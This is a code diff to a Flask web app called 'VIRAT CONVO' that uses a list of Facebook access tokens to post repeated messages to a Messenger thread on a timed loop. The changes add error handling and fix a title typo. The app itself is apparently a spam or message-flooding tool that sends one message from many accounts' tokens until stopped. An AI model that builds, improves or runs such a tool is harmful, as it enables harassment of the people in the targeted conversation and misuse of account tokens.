@@ -1,3 +1,4 @@
+
 from flask import Flask, request, render_template_string
 import requests
 from threading import Thread, Event
@@ -22,7 +23,12 @@ headers = {
  
 stop_events = {}
 threads = {}
- 
+
+# Error handler to catch exceptions and log them
+@app.errorhandler(Exception)
+def handle_error(error):
+    return f"An error occurred: {str(error)}", 500
+
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -30,14 +36,17 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
+                try:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message Sent Successfully From token {access_token}: {message}")
+                    else:
+                        print(f"Message Sent Failed From token {access_token}: {message}")
+                except Exception as e:
+                    print(f"Error sending message from token {access_token}: {str(e)}")
                 time.sleep(time_interval)
  
 @app.route('/', methods=['GET', 'POST'])
@@ -73,7 +82,7 @@ def send_message():
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VIRAT  CONVO</title>
+  <title>VIRAT CONVO</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
